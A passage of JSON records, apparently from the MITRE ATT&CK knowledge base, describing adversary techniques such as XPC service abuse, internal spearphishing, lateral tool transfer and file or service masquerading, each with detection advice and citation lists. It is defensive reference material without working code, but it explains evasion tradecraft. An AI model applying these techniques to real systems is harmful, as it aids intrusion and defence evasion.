ESET RTM Feb 2017),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Accenture MUDCARP March 2019),(Citation: Eset Ramsay May 2020),(Citation: McAfee APT28 DDE1 Nov 2017),(Citation: Talos PoetRAT April 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: McAfee APT28 DDE2 Nov 2017),(Citation: GitHub Disable DDEAUTO Oct 2017),(Citation: Microsoft DDE Advisory Nov 2017),(Citation: Microsoft ADV170021 Dec 2017),(Citation: Microsoft Protected View),(Citation: Enigma Reviving DDE Jan 2018),(Citation: Microsoft ASR Nov 2017),(Citation: BleepingComputer DDE Disabled in Word Dec 2017)"}
{"ID":"T1559.003","name":"Inter-Process Communication: XPC Services","description":"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)\n\nAdversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).","url":"https://attack.mitre.org/techniques/T1559/003","created":"12 October 2021","last modified":"20 April 2022","version":"1.0","tactics":"Execution","detection":null,"platforms":"macOS","data sources":"Process: Process Access","is sub-technique":true,"sub-technique of":"T1559","defenses bypassed":null,"contributors":"Csaba Fitzl @theevilbit of Offensive Security","permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1534","name":"Internal Spearphishing","description":"Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)\n\nAdversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.\n\nThere have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the campaign and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)","url":"https://attack.mitre.org/techniques/T1534","created":"04 September 2019","last modified":"08 March 2022","version":"1.2","tactics":"Lateral Movement","detection":"Network intrusion detection systems and email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing campaigns.(Citation: Trend Micro When Phishing Starts from the Inside 2017)","platforms":"Google Workspace, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC); Tim MalcomVetter","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: KISA Operation Muzabi),(Citation: SecureWorks August 2019),(Citation: ESET Gamaredon June 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: CISA AA21-200A APT40 July 2021),"}
{"ID":"T1570","name":"Lateral Tool Transfer","description":"Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).","url":"https://attack.mitre.org/techniques/T1570","created":"11 March 2020","last modified":"19 April 2022","version":"1.2","tactics":"Lateral Movement","detection":"Monitor for file creation and files transferred within a network using protocols such as SMB or FTP. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Metadata, Named Pipe: Named Pipe Metadata, Network Share: Network Share Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Turla PowerShell May 2019),(Citation: Dragos Crashoverride 2018),(Citation: NCC Group Chimera January 2021),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: LOLBAS Esentutl),(Citation: FoxIT Wocao December 2019),(Citation: Costa AvosLocker May 2022),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Microsoft GALLIUM December 2019),(Citation: LOLBAS Expand),(Citation: Symantec Waterbug Jun 2019),(Citation: Microsoft About BITS),(Citation: Microsoft BlackCat Jun 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: Linux FTP),(Citation: PsExec Russinovich),(Citation: Sophos Netwalker May 2020),(Citation: Microsoft FTP),(Citation: DustySky),(Citation: DFIR Phosphorus November 2021),(Citation: LogRhythm WannaCry),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Talos Olympic Destroyer 2018),(Citation: FireEye FIN10 June 2017),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Unit42 LockerGoga 2019),(Citation: ESET Hermetic Wizard March 2022),(Citation: TechNet Copy),(Citation: Cisco Talos Avos Jun 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft Preventing SMB),(Citation: University of Birmingham C2)"}
{"ID":"T1036","name":"Masquerading","description":"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)","url":"https://attack.mitre.org/techniques/T1036","created":"31 May 2017","last modified":"07 April 2023","version":"1.5","tactics":"Defense Evasion","detection":"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nLook for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE”.","platforms":"Containers, Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Metadata, File: File Modification, Image: Image Metadata, Process: Process Metadata, Scheduled Job: Scheduled Job Metadata, Scheduled Job: Scheduled Job Modification, Service: Service Creation, Service: Service Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Application Control","contributors":"Bartosz Jerzman; David Lu, Tripwire; Elastic; Felipe Espósito, @Pr0teus; Nick Carr, Mandiant; Oleg Kolesnikov, Securonix","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Malwarebytes Kimsuky June 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Talos Nyetya June 2017),(Citation: trendmicro xcsset xcode project 2020),(Citation: McAfee Honeybee),(Citation: Check Point APT34 April 2021),(Citation: SentinelOne NobleBaron June 2021),(Citation: Securelist Octopus Oct 2018),(Citation: DFIR Conti Bazar Nov 2021),(Citation: BlackBerry Bahamut),(Citation: Unit42 Redaman January 2019),(Citation: US-CERT TA18-074A),(Citation: Cyberreason Anchor December 2019),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Unit 42 TA551 Jan 2021),(Citation: Symantec RAINDROP January 2021),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Twitter ItsReallyNick Platinum Masquerade),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Trend Micro Tick November 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: Eset Ramsay May 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Google Election Threats October 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Medium S2W WhisperGate January 2022),(Citation: Prevailion DarkWatchman 2021),(Citation: objective-see windtail1 dec 2018),(Citation: Cylance Dust Storm),(Citation: KISA Operation Muzabi),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: ESET Dukes October 2019),(Citation: NTT Security Flagpro new December 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: ANSSI RYUK RANSOMWARE),(Citation: Talos Bisonal Mar 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cisco Talos Avos Jun 2022),(Citation: Cybereason Cobalt Kitty 2017),"}
{"ID":"T1036.007","name":"Masquerading: Double File Extension","description":"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.","url":"https://attack.mitre.org/techniques/T1036/007","created":"04 August 2021","last modified":"14 October 2021","version":"1.0","tactics":"Defense Evasion","detection":"Monitor for files written to disk that contain two file extensions, particularly when the second is an executable.(Citation: Seqrite DoubleExtension)","platforms":"Windows","data sources":"File: File Creation, File: File Metadata","is sub-technique":true,"sub-technique of":"T1036","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: ClearSky Siamesekitten August 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Cybereason Bazar July 2020),(Citation: Seqrite DoubleExtension),(Citation: HowToGeek ShowExtension)"}
{"ID":"T1036.001","name":"Masquerading: Invalid Code Signature","description":"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)\n\nUnlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.","url":"https://attack.mitre.org/techniques/T1036/001","created":"10 February 2020","last modified":"10 February 2020","version":"1.0","tactics":"Defense Evasion","detection":"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.","platforms":"Windows, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1036","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: objective-see windtail1 dec 2018),(Citation: McAfee Netwire Mar 2015),(Citation: Securelist ScarCruft Jun 2016),(Citation: Kaspersky Regin),(Citation: ESET Gelsemium June 2021),(Citation: SANS Windshift August 2018),"}
{"ID":"T1036.008","name":"Masquerading: Masquerade File Type","description":"Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)","url":"https://attack.mitre.org/techniques/T1036/008","created":"08 March 2023","last modified":"11 April 2023","version":"1.0","tactics":"Defense Evasion","detection":null,"platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Modification","is sub-technique":true,"sub-technique of":"T1036","defenses bypassed":null,"contributors":"Ben Smith; CrowdStrike Falcon OverWatch","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: McAfee Lazarus Jul 2020),(Citation: Dragos Crashoverride 2018),(Citation: Trend Micro AvosLocker Apr 2022),(Citation: ESET Lazarus Jun 2020),(Citation: Group IB Ransomware September 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro Black Basta October 2022),(Citation: file_upload_attacks_pt2)"}
{"ID":"T1036.004","name":"Masquerading: Masquerade Task or Service","description":"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)","url":"https://attack.mitre.org/techniques/T1036/004","created":"10 February 2020","last modified":"18 October 2021","version":"1.1","tactics":"Defense Evasion","detection":"Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Scheduled Job: Scheduled Job Metadata, Scheduled Job: Scheduled Job Modification, Service: Service Creation, Service: Service Metadata","is sub-technique":true,"sub-technique of":"T1036","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Black Basta May 2022),(Citation: Kaspersky Carbanak),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Fysbis Dr Web Analysis),(Citation: ESET Okrum July 2019),(Citation: Symantec Catchamas April 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: Tarrask scheduled task),(Citation: Unit 42 PingPull Jun 2022),(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Mandiant APT1 Appendix),(Citation: Symantec Orangeworm April 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: CISA AA20-301A Kimsuky),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: ESET Machete July 2019),(Citation: Symantec Backdoor.Nidiran),(Citation: Bitdefender Naikon April 2021),(Citation: Minerva Labs Black Basta May 2022),(Citation: Trend Micro Tick November 2019),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Kroll RawPOS Jan 2017),(Citation: Microsoft Win Defender Truvasys Sep 2017),(Citation: Sophos Maze VM September 2020),(Citation: Talos TinyTurla September 2021),(Citation: ESET Crutch December 2020),(Citation: Volexity SolarWinds),(Citation: FireEye APT10 April 2017),(Citation: Morphisec FIN7 June 2017),(Citation: Malwarebytes Konni Aug 2021),(Citation: Symantec Volgmer Aug 2014),(Citation: Palo Alto Shamoon Nov 2016),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: ESET TeleBots Oct 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: ClearSky MuddyWater Nov 2018),(Citation: ASERT InnaputRAT April 2018),(Citation: ESET Attor Oct 2019),(Citation: Microsoft SAM),(Citation: McAfee Shamoon December 2018),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Unit42 RDAT July 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Cyble Black Basta May 2022),(Citation: Malwarebytes Higaisa 2020),(Citation: Intrinsec Egregor Nov 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: ESET InvisiMole June 2020),(Citation: TrendMicro RawPOS April 2015),(Citation: Unit42 Redaman January 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: FireEye APT32 May 2017),(Citation: Cybereason Bazar July 2020),(Citation: HP SVCReady Jun 2022),(Citation: Mandiant APT41),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: ESET ComRAT May 2020),(Citation: Unit 42 Hildegard Malware),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: Check Point Meteor Aug 2021),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Trend Micro MacOS Backdoor November 2020),"}
{"ID":"T1036.005","name":"Masquerading: Match Legitimate Name or Location","description":"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.","url":"https://attack.mitre.org/techniques/T1036/005","created":"10 February 2020","last modified":"30 March 2023","version":"1.1","tactics":"Defense Evasion","detection":"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nIn containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.","platforms":"Containers, Linux, Windows, macOS","data sources":"File: File Metadata, Image: Image Metadata, Process: Process Metadata","is sub-technique":true,"sub-technique of":"T1036","defenses bypassed":"Application Control","contributors":"Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trusteer Carberp October 2010),(Citation: Guidepoint SUPERNOVA Dec 2020),(Citation: Mandiant APT1),(Citation: Group IB Silence Sept 2018),(Citation: CyberBit Dtrack),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Talos Konni May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Symantec Tick Apr 2016),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Kaspersky Carbanak),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: ESET InvisiMole June 2018),(Citation: Fysbis Dr Web Analysis),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: wardle evilquest partii),(Citation: ESET Nomadic Octopus 2018),(Citation: NCSC Cyclops Blink February 2022),(Citation: Morphisec ShellTea June 2019),(Citation: Kaspersky Poseidon Group),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Leonardo Turla Penquin May 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Tarrask scheduled task),(Citation: BitDefender Chafer May 2020),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Talos Promethium June 2020),(Citation: Secure List Bad Rabbit),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: KISA Operation Muzabi),(Citation: ESET Casbaneiro Oct 2019),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Talos Bisonal Mar 2020),(Citation: Lotus Blossom Jun 2015),(Citation: RedCanary Mockingbird May 2020),(Citation: Mandiant APT1 Appendix),(Citation: NCC Group Team9 June 2020),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Securelist Calisto July 2018),(Citation: ClearSky Siamesekitten August 2021),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Cisco Talos Intelligence Group),(Citation: CrowdStrike Ryuk January 2019),(Citation: ESET PipeMon May 2020),(Citation: Symantec Sowbug Nov 2017),(Citation: ESET Bad Rabbit),(Citation: Volexity Ocean Lotus November 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: Unit 42 Gamaredon February 2022),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: ESET Machete July 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: CERT-FR PYSA April 2020),(Citation: Dragos Crashoverride 2017),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Baumgartner Naikon 2015),(Citation: Symantec Remsec IOCs),(Citation: Bitdefender Naikon April 2021),(Citation: FireEye TRITON 2019),(Citation: FireEye admin@338),(Citation: Red Canary NETWIRE January 2020),(Citation: reed thiefquest ransomware analysis),(Citation: Trend Micro IXESHE 2012),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Eset Ramsay May 2020),(Citation: ESET Gelsemium June 2021),(Citation: FBI FLASH APT39 September 2020),(Citation: Anomali Static Kitten February 2021),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Talos TinyTurla September 2021),(Citation: FireEye APT28),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Qualys LolZarus),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Volexity SolarWinds),(Citation: FireEye MuddyWater Mar 2018),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Volexity Patchwork June 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Intezer Doki July 20),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Microsoft DTC),(Citation: Recorded Future REDDELTA July 2020),(Citation: McAfee Cuba April 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET Telebots Dec 2016),(Citation: SentinelOne NobleBaron June 2021),(Citation: Talos Rocke August 2018),(Citation: Securelist Octopus Oct 2018),(Citation: ESET Sednit USBStealer 2014),(Citation: Unit42 SUPERNOVA Dec 2020),(Citation: FireEye APT41 Aug 2019),(Citation: ZScaler Hacking Team),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Dell TG-3390),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Forcepoint Felismus Mar 2017),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Kaspersky LuminousMoth July 2021),(Citation: ASERT InnaputRAT April 2018),(Citation: Prevx Carberp March 2011),(Citation: FinFisher Citation),(Citation: Secureworks MCMD July 2019),(Citation: Symantec Whitefly March 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: Cylance Dust Storm),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Unit42 RDAT July 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Cisco Talos Avos Jun 2022),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: IBM Grandoreiro April 2020),(Citation: 360 Machete Sep 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Medium Metamorfo Apr 2020),(Citation: Check Point Black Basta October 2022),(Citation: Microsoft NICKEL December 2021),(Citation: ESET LightNeuron May 2019),(Citation: Microsoft DUBNIUM June 2016),(Citation: ESET InvisiMole June 2020),(Citation: Trend Micro Skidmap),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Picus Sodinokibi January 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Malwarebytes Pony April 2016),(Citation: Intego Shlayer Feb 2018),(Citation: Cybereason Bazar July 2020),(Citation: Securelist Machete Aug 2014),(Citation: ClearSky Lazarus Aug 2020),(Citation: Symantec RAINDROP January 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Mandiant APT41),(Citation: Talos MuddyWater May 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 BackConfig May 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Dragos EKANS),(Citation: Carbon Black Shlayer Feb 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: Microsoft Winnti Jan 2017),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Cymmetria Patchwork),(Citation: CrowdStrike 